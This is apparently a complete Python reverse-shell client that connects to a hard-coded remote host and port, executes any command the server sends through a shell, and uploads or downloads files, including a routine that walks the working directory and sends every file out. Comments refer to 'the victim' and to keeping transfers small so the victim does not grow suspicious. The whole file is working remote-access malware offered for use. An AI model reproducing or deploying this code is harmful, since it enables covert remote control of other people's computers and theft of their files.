import os
import socket
import subprocess
import struct
import time
import sys

class Client():

    def __init__(self):
        self.sock = None
        self.host = '10.20.50.13'
        self.port = 5555

    # Create a socket
    def socket_create(self):
        try:
            self.sock = socket.socket()
        except socket.error as msg:
            print("Socket creation error: " + str(msg))

    # Connect to a remote socket
    def socket_connect(self):
        try:
            self.sock.connect((self.host, self.port))
        except socket.error as msg:
            print("Socket connection error: " + str(msg))

    def download(self, data):
        data = data[:].decode("utf-8").split('@')[1]
        if os.path.exists(data):
            file = open(data, 'rb')
            # package read as a byte
            # 200 KB transfer buffer, dont make the victim feels suspicious
            packet = file.read(204800)
            # package send as a byte
            while packet != str.encode(''):
                self.sock.send(packet)
                # 2 MB transfer buffer
                packet = file.read(204800)
            # parameter send as a byte
            self.sock.send(str.encode('Transfer %s Complete' % data))
            file.close()
        else:
            self.sock.send(str.encode('download@False'))


    def download_all(self):
        for path, _, files in os.walk(os.getcwd()):
            self.sock.send(str.encode('download@fldr'))
            self.sock.send(struct.pack('>I', len(str.encode(path))) + str.encode(path))
            for file in files:
                loc = os.path.join(path, file)
                self.sock.send(str.encode('download@file'))
                self.sock.send(struct.pack('>I', len(str.encode(loc))) + str.encode(loc))
        self.sock.send(str.encode('download@done'))

        for path, folders, files in os.walk(os.getcwd()):
            for file in files:
                data = open(os.path.join(path, file), 'rb')
                # package read as a byte
                # 200 KB transfer buffer, dont make the victim feels suspicious
                packet = data.read(204800)
                # package send as a byte
                while packet != str.encode(''):
                    self.sock.send(packet)
                    # 2 MB transfer buffer
                    packet = data.read(204800)
                # parameter send as a byte
                self.sock.send(str.encode('Transfer %s Complete' %file))
                data.close()
                time.sleep(1)



    def upload(self, command):
        fname = command.decode("utf-8").split('@')[-1]
        file = open('%s' %(fname), 'wb')
        while True:
            # file recv as a bytes
            bits = self.sock.recv(204800)
            if bits.endswith(str.encode('Transfer %s Complete' % command.decode("utf-8").split('@')[-1])):
                file.write(bits[:len(bits)-len('Transfer %s Complete' % command.decode("utf-8").split('@')[-1])])
                break
            file.write(bits)
        file.close()


    def print_output(self, output_str):
        """ Prints command output """
        sent_message = str.encode(output_str + str(os.getcwd()) + '> ')
        # send back as a byte
        # sending the length of data (data + working directory) + the data (data + working directory)
        self.sock.send(struct.pack('>I', len(sent_message)) + sent_message)
        return


    # Receive commands from remote server and run on local machine
    def receive_commands(self):
        try:
            self.sock.recv(10)
        except Exception as e:
            print('Could not start communication with server: %s\n' %str(e))
            return
        cwd = str.encode(str(os.getcwd()) + '> ')
        self.sock.send(struct.pack('>I', len(cwd)) + cwd)
        while True:
            output_str = None
            try:
                data = self.sock.recv(20480)
            except:
                break
                sys.exit()
            if data == b'': break
            elif data[:2].decode("utf-8") == 'cd':
                directory = data[3:].decode("utf-8")
                try:
                    os.chdir(directory.strip())
                except Exception as e:
                    output_str = "Could not change directory: %s\n" %str(e)
                else:
                    output_str = ""
            elif data[:].decode("utf-8") == 'download@*.*':
                self.download_all()
                time.sleep(1)
                cwd = str.encode(str(os.getcwd()) + '> ')
                self.sock.send(struct.pack('>I', len(cwd)) + cwd)
                continue
            elif 'download@' in data[:].decode("utf-8"):
                self.download(data)
                time.sleep(1)
                cwd = str.encode(str(os.getcwd()) + '> ')
                self.sock.send(struct.pack('>I', len(cwd)) + cwd)
                continue
            elif 'upload@' in data[:].decode("utf-8"):
                self.upload(data)
                cwd = str.encode(str(os.getcwd()) + '> ')
                self.sock.send(struct.pack('>I', len(cwd)) + cwd)
                continue
            elif len(data) > 0 and not 'download@' in data[:].decode("utf-8") and not 'upload@' in data[:].decode("utf-8"):
                try:
                    cmd = subprocess.Popen( data[:].decode("utf-8"),
                                            shell=True,
                                            stdout=subprocess.PIPE,
                                            stderr=subprocess.PIPE,
                                            stdin=subprocess.PIPE )
                    output_bytes = cmd.stdout.read() + cmd.stderr.read()
                    output_str = output_bytes.decode("utf-8", errors="replace")
                except Exception as e:
                    # TODO: Error description is lost
                    output_str = "Command execution unsuccessful: %s\n" %str(e)

            if output_str is not None:
                try:
                    self.print_output(output_str)
                except Exception as e:
                    print('Cannot send command output: %s' %str(e))


        self.sock.close()
        return


    def main(self):
        self.socket_create()
        self.socket_connect()
        self.receive_commands()


Client().main()
